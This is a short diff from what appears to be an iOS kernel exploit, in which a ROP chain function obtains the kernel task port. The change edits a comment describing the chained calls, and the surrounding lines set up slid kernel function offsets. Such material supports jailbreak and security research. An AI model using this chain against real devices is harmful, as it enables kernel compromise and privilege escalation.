@@ -68,7 +68,7 @@ void rop_get_kernel_task(addr_t **chain, task_t *task)
     }                                                                                       //  |
     // Get kernel task                                                                          |
     {                                                                                       //  |
-        // *task = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), get_task_ipcspace(current_task()));
+        // *task = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);
         const addr_t current_task          = offsets.slid.func_current_task,                //  |
                      ipc_port_make_send    = offsets.slid.func_ipc_port_make_send,          //  |
                      ipc_port_copyout_send = offsets.slid.func_ipc_port_copyout_send,       //  |
